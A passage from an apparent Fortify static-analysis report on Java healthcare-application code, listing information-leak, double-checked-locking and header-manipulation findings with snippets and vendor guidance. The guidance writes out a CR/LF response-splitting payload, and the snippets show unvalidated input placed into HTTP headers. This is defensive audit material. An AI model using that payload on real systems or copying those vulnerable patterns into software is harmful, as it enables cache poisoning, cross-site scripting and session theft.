Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an "Access Denied" message can reveal that a file or user exists on the system. Because of this, never send information to a resource directly outside the program.

Example 4: The following code broadcasts the stack trace of a caught exception within your application only, so that it cannot be leaked to other apps on the system. Additionally, this technique is more efficient than globally broadcasting through the system.


...
try {
  ...
} catch (Exception e) {
    String exception = Log.getStackTraceString(e);
    Intent i = new Intent();
    i.setAction("SEND_EXCEPTION");
    i.putExtra("exception", exception);
    LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i);
}
...


If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Do not include system data in the messages pushed to other devices in range, encrypt the payload of the message, or establish a secure communication channel at a higher layer.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own.

2. This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use Audit Guide to filter out this category from your scan results.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>17</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5E2A4F5A00E895240F6CEE305C1ED745" ruleID="3AB8850E-323C-46E8-B8A4-BD650010E4AE">
                            <Category>System Information Leak: External</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function sendEmail() in SendEmail.java reveals system data or debug information by calling setSubject() on line 51. The information revealed by setSubject() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>51</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AuditLetterGenerattor.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/AuditLetterGenerattor.java</FilePath>
<LineStart>71</LineStart>
<Snippet>						SystemProperties.getProperty(EHRCommonConstants.EHR_MODULE_NAME, "EHRMippEmailId"), 
						"Exception", 
						e.getMessage());
				}catch (Exception ee) {
					ee.printStackTrace();</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="440434B3BF554B4BEDE4D5A328189E99" ruleID="3AB8850E-323C-46E8-B8A4-BD650010E4AE">
                            <Category>System Information Leak: External</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function sendEmail() in SendEmail.java reveals system data or debug information by calling setSubject() on line 51. The information revealed by setSubject() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>51</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AuditManagerImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/business/impl/AuditManagerImpl.java</FilePath>
<LineStart>537</LineStart>
<Snippet>							sendEmail.sendEmail(SystemProperties.getProperty(EHRCommonConstants.EHR_MODULE_NAME, "EHRMippEmailId"),
									SystemProperties.getProperty(EHRCommonConstants.EHR_MODULE_NAME, "EHRMippEmailId"), "Exception",
									ex.getMessage());
						} catch (Exception ee) {
							ee.printStackTrace();</Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E846702146D99CD59E17B237D3A6D2B1" ruleID="3AB8850E-323C-46E8-B8A4-BD650010E4AE">
                            <Category>System Information Leak: External</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function sendEmail() in SendEmail.java reveals system data or debug information by calling setSubject() on line 51. The information revealed by setSubject() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>51</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CNSIEncoderException.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/encoder/CNSIEncoderException.java</FilePath>
<LineStart>110</LineStart>
<Snippet>                 
               {
             	   b_sMsg += m_objChainedException.getMessage();
                }//end of if ((m_objChainedException != null)
        </Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C79E73C678513ADCA60437FB9F7B58F9" ruleID="3AB8850E-323C-46E8-B8A4-BD650010E4AE">
                            <Category>System Information Leak: External</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function sendEmail() in SendEmail.java reveals system data or debug information by calling setSubject() on line 51. The information revealed by setSubject() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>51</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AuditManagerImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/business/impl/AuditManagerImpl.java</FilePath>
<LineStart>537</LineStart>
<Snippet>							sendEmail.sendEmail(SystemProperties.getProperty(EHRCommonConstants.EHR_MODULE_NAME, "EHRMippEmailId"),
									SystemProperties.getProperty(EHRCommonConstants.EHR_MODULE_NAME, "EHRMippEmailId"), "Exception",
									ex.getMessage());
						} catch (Exception ee) {
							ee.printStackTrace();</Snippet>
<TargetFunction>Read ex()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D3A13DDBC5F118C9C990A68436C3CFAB" ruleID="3AB8850E-323C-46E8-B8A4-BD650010E4AE">
                            <Category>System Information Leak: External</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function sendEmail() in SendEmail.java reveals system data or debug information by calling setSubject() on line 51. The information revealed by setSubject() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>51</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CNSIException.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/exception/CNSIException.java</FilePath>
<LineStart>243</LineStart>
<Snippet>                  )
               {
             	   l_sErrorMessage = m_objChainedException.getMessage();
                }//end of if ((m_objChainedException != null)
         }//end of else if (m_sErrorCode != null)</Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="16">
                        <groupTitle>Code Correctness: Double-Checked Locking</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method getPageAttributeValue() in ActionMapper.java relies on double-checked locking, an incorrect idiom that does not achieve the intended effect.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Many talented individuals have spent a great deal of time pondering ways to make double-checked locking work in order to improve performance. None have succeeded.

Example 1: At first blush it may seem that the following bit of code achieves thread safety while avoiding unnecessary synchronization.


if (fitz == null) {
  synchronized (this) {
    if (fitz == null) {
      fitz = new Fitzer();
    }
  }
}
return fitz;


The programmer wants to guarantee that only one Fitzer() object is ever allocated, but does not want to pay the cost of synchronization every time this code is called. This idiom is known as double-checked locking.

Unfortunately, it does not work, and multiple Fitzer() objects can be allocated. See The "Double-Checked Locking is Broken" Declaration for more details [1].</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Synchronization is probably less expensive than you believe. In many cases, the best thing to do is to use the most straightforward solution.

Example 2: The code in Example 1 could be rewritten in the following way:


synchronized (this) {
  if (fitz == null) {
    fitz = new Fitzer();
  }
  return fitz;
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>16</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="90A8E5007F266C1AE0A5AEBB8128E749" ruleID="1E791168-F77C-40C2-B509-30F9ADDBA788">
                            <Category>Code Correctness: Double-Checked Locking</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method getOptionalParameters() in ActionMapper.java relies on double-checked locking, an incorrect idiom that does not achieve the intended effect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>842</LineStart>
<Snippet>            {
                l_sReturnValueObj = OPTIONAL_PARAM_CACHE.get(key);
                if (l_sReturnValueObj == null)
                {
                    Element l_objPageElement = getPageElement(p_sModuleName, p_sPageName);</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E07D8E2087A2CDD86EBECD4598ADF2AE" ruleID="1E791168-F77C-40C2-B509-30F9ADDBA788">
                            <Category>Code Correctness: Double-Checked Locking</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method getPageAttributeValue() in ActionMapper.java relies on double-checked locking, an incorrect idiom that does not achieve the intended effect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>512</LineStart>
<Snippet>            {
                l_sReturnObject = MODULE_PAGE_ATTRIBUTE_CACHE.get(key);
                if (l_sReturnObject == null)
                {
    String l_sReturnString = null;</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0D4DFCB6DF7BCFBC5ED78A7DAE070C92" ruleID="1E791168-F77C-40C2-B509-30F9ADDBA788">
                            <Category>Code Correctness: Double-Checked Locking</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method getSessionObjects() in ActionMapper.java relies on double-checked locking, an incorrect idiom that does not achieve the intended effect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>801</LineStart>
<Snippet>            {
                l_mapReturnValuesObj = SESSION_OBJECT_CACHE.get(key);
                if (l_mapReturnValuesObj == null)
                {
                    Element l_objSessionObjectElement = null;</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="820F3FF2EFBCAD8F28E7AF7A45EB368C" ruleID="1E791168-F77C-40C2-B509-30F9ADDBA788">
                            <Category>Code Correctness: Double-Checked Locking</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method getControlAttributeValue() in ActionMapper.java relies on double-checked locking, an incorrect idiom that does not achieve the intended effect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>602</LineStart>
<Snippet>            {
                l_sReturnObject = CTRL_ATTRIB_VALUE_CACHE.get(key);
                if (l_sReturnObject == null)
                {
    Element l_objControlElement =</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="454CCF9AA004677A90E09C216C9670E8" ruleID="1E791168-F77C-40C2-B509-30F9ADDBA788">
                            <Category>Code Correctness: Double-Checked Locking</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method getControlStatusAttributeValue() in ActionMapper.java relies on double-checked locking, an incorrect idiom that does not achieve the intended effect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>654</LineStart>
<Snippet>            {
                l_sReturnObject = CTRL_STATUS_ATTR_CACHE.get(key);
                if (l_sReturnObject == null)
                {
                    Element l_objStatusElement = getControlStatusElement(p_sModuleName,</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Header Manipulation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method serviceRequest() in ShowAttachmentServlet.java includes unvalidated data in an HTTP response header on line 112. This enables attacks such as cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Header Manipulation vulnerabilities occur when:

1. Data enters a web application through an untrusted source, most frequently an HTTP request.


2. The data is included in an HTTP response header sent to a web user without being validated.

As with many software security vulnerabilities, Header Manipulation is a means to an end, not an end in itself. At its root, the vulnerability is straightforward: an attacker passes malicious data to a vulnerable application, and the application includes the data in an HTTP response header.

One of the most common Header Manipulation attacks is HTTP Response Splitting. To mount a successful HTTP Response Splitting exploit, the application must allow input that contains CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n)characters into the header. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but also allows them to create additional responses entirely under their control.

Many of today's modern application servers will prevent the injection of malicious characters into HTTP headers. For example, recent versions of Apache Tomcat will throw an IllegalArgumentException if you attempt to set a header with prohibited characters. If your application server prevents setting headers with new line characters, then your application is not vulnerable to HTTP Response Splitting. However, solely filtering for new line characters can leave an application vulnerable to Cookie Manipulation or Open Redirects, so care must still be taken when setting HTTP headers with user input.

Example: The following code segment reads the name of the author of a weblog entry, author, from an HTTP request and sets it in a cookie header of an HTTP response.


String author = request.getParameter(AUTHOR_PARAM);
...
Cookie cookie = new Cookie("author", author);
     cookie.setMaxAge(cookieExpiration);
     response.addCookie(cookie);


Assuming a string consisting of standard alphanumeric characters, such as "Jane Smith", is submitted in the request the HTTP response including this cookie might take the following form:


HTTP/1.1 200 OK
...
Set-Cookie: author=Jane Smith
...


However, because the value of the cookie is formed of unvalidated user input the response will only maintain this form if the value submitted for AUTHOR_PARAM does not contain any CR and LF characters. If an attacker submits a malicious string, such as "Wiley Hacker\r\nHTTP/1.1 200 OK\r\n...", then the HTTP response would be split into two responses of the following form:


HTTP/1.1 200 OK
...
Set-Cookie: author=Wiley Hacker

HTTP/1.1 200 OK
...


Clearly, the second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability of attacker to construct arbitrary HTTP responses permits a variety of resulting attacks, including: cross-user defacement, web and browser cache poisoning, cross-site scripting, and page hijacking.

Cross-User Defacement: An attacker will be able to make a single request to a vulnerable server that will cause the server to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the server. This can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server. In the best case, an attacker may leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application. In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker.

Cache Poisoning: The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although only the user of the local browser instance will be affected.

Cross-Site Scripting: Once attackers have control of the responses sent by an application, they have a choice of a variety of malicious content to provide users. Cross-site scripting is common form of attack where malicious JavaScript or other code included in a response is executed in the user's browser. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. The most common and dangerous attack vector against users of a vulnerable application uses JavaScript to transmit session and authentication information back to the attacker who can then take complete control of the victim's account.

Page Hijacking: In addition to using a vulnerable application to send malicious content to a user, the same root vulnerability can also be leveraged to redirect sensitive content generated by the server and intended for the user to the attacker instead. By submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker may cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server for the user to the attacker. Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.

Cookie Manipulation: When combined with attacks like Cross-Site Request Forgery, attackers may change, add to, or even overwrite a legitimate user's cookies.

Open Redirect: Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The solution to Header Manipulation is to ensure that input validation occurs in the correct places and checks for the correct properties.

Since Header Manipulation vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating responses dynamically, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for Header Manipulation.

Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for Header Manipulation is generally relatively easy. Despite its value, input validation for Header Manipulation does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent Header Manipulation vulnerabilities is to validate everything that enters the application or leaves the application destined for the user.

The most secure approach to validation for Header Manipulation is to create a whitelist of safe characters that are allowed to appear in HTTP response headers and accept input composed exclusively of characters in the approved set. For example, a valid name might only include alphanumeric characters or an account number might only include digits 0-9.

A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning in HTTP response headers. Although the CR and LF characters are at the heart of an HTTP response splitting attack, other characters, such as ':' (colon) and '=' (equal), have special meaning in response headers as well.

After you identify the correct points in an application to perform validation for Header Manipulation attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. The application should reject any input destined to be included in HTTP response headers that contains special characters, particularly CR and LF, as invalid.

Many application servers attempt to limit an application's exposure to HTTP response splitting vulnerabilities by providing implementations for the functions responsible for setting HTTP headers and cookies that perform validation for the characters essential to an HTTP response splitting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Many HttpServletRequest implementations return a URL-encoded string from getHeader(), will not cause a HTTP response splitting issue unless it is decoded first because the CR and LF characters will not carry a meta-meaning in their encoded form. However, this behavior is not specified in the J2EE standard and varies by implementation. Furthermore, even encoded user input returned from getHeader() can lead to other vulnerabilities, including open redirects and other HTTP header tampering.

2. A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>15</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="42CBC918E54E14F4BD8B9A711EEDA87D" ruleID="790A125E-5BFE-4931-A51A-29B7D5BECC93">
                            <Category>Header Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method serviceRequest() in ShowAttachmentServlet.java includes unvalidated data in an HTTP response header on line 112. This enables attacks such as cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ShowAttachmentServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/common/attachment/handler/ShowAttachmentServlet.java</FilePath>
<LineStart>112</LineStart>
<Snippet>            {
                p_objHttpServletResponse.setHeader("Content-Disposition", 
                    "attachment;filename=\"" + b_sFileName + "\"");
            } // if
</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.setHeader()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>NLRArtifactHeaderDAOImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/service/impl/NLRArtifactHeaderDAOImpl.java</FilePath>
<LineStart>27</LineStart>
<Snippet>     */
	public NLRArtifactHeader findById(long nlrArtifactHeaderSid){
		return em.find(NLRArtifactHeader.class, nlrArtifactHeaderSid);
	}
	</Snippet>
<TargetFunction>javax.persistence.EntityManager.find()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="84C970C51C60C0BA6BE6E6B3DF07F078" ruleID="790A125E-5BFE-4931-A51A-29B7D5BECC93">
                            <Category>Header Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in dlgDownloadPDF.jsp includes unvalidated data in an HTTP response header on line 22. This enables attacks such as cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>dlgDownloadPDF.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/provider/registration/mu/dlgDownloadPDF.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>        	if (l_objFileInfoDB !=null)
        	{
        		response.setHeader("Content-Disposition", "attachment; filename=" + l_objFileInfoDB.getFileName() );  
	         	response.setContentType(l_objFileInfoDB.getContentType());	         	
	         	response.getOutputStream().write(FileUtil.getContentInByte(l_sFileNameWithLoc, false));</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.setHeader()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>906</LineStart>
<Snippet>        {
            //if the oeprator is not between, return as it is from request object.
            l_objRetFilterValue = (String) p_reqRequest.getParameter(p_sFilter);
        }
        //end of else-if(p_sOperator.equalsIgnoreCase("BETWEEN") ||</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="190F58DBB0EE7B77CC3C961B5810F1DE" ruleID="790A125E-5BFE-4931-A51A-29B7D5BECC93">
                            <Category>Header Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in dlgDownloadPDF.jsp includes unvalidated data in an HTTP response header on line 22. This enables attacks such as cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>dlgDownloadPDF.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/provider/registration/mu/dlgDownloadPDF.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>        	if (l_objFileInfoDB !=null)
        	{
        		response.setHeader("Content-Disposition", "attachment; filename=" + l_objFileInfoDB.getFileName() );  
	         	response.setContentType(l_objFileInfoDB.getContentType());	         	
	         	response.getOutputStream().write(FileUtil.getContentInByte(l_sFileNameWithLoc, false));</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.setHeader()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>838</LineStart>
<Snippet>        {
            //since it is a range operator, get the values from request as string array.
            l_objRetFilterValue = p_reqRequest.getParameterValues(p_sFilter);
            List l_lstList = CollectionUtil.convertStringArrayToList((String[]) l_objRetFilterValue);
            /*if(l_lstList.size() &lt; 2)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8D78F8DF815D4B3854343B390915D596" ruleID="790A125E-5BFE-4931-A51A-29B7D5BECC93">
                            <Category>Header Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in dlgDownloadPDF.jsp includes unvalidated data in an HTTP response header on line 22. This enables attacks such as cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>dlgDownloadPDF.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/provider/registration/mu/dlgDownloadPDF.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>        	if (l_objFileInfoDB !=null)
        	{
        		response.setHeader("Content-Disposition", "attachment; filename=" + l_objFileInfoDB.getFileName() );  
	         	response.setContentType(l_objFileInfoDB.getContentType());	         	
	         	response.getOutputStream().write(FileUtil.getContentInByte(l_sFileNameWithLoc, false));</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.setHeader()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>250</LineStart>
<Snippet>        {
            l_sGridName = p_reqRequest.getParameter(GRID_NAME);
            l_enmParameterNames = p_reqRequest.getParameterNames();
            boolean isFld=false;
            l_sPageName=p_reqRequest.getParameter("fhdn&amp;PageName");</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="09287FC676AE214E81B2E1FFE1F5A341" ruleID="790A125E-5BFE-4931-A51A-29B7D5BECC93">
                            <Category>Header Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method _jspService() in dlgDownloadDocument.jsp includes unvalidated data in an HTTP response header on line 32. This enables attacks such as cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>dlgDownloadDocument.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/provider/registration/dlgDownloadDocument.jsp</FilePath>
<LineStart>32</LineStart>
<Snippet>		        	if (l_objFileInfoDB !=null)
		        	{
		        		response.setHeader("Content-Disposition", "attachment; filename=" + l_objFileInfoDB.getFileName() );  
			         	response.setContentType(l_objFileInfoDB.getContentType());	         	
			         	response.getOutputStream().write((byte[])l_objFileInfoDB.getData());</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.setHeader()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>NLRArtifactHeaderDAOImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/service/impl/NLRArtifactHeaderDAOImpl.java</FilePath>
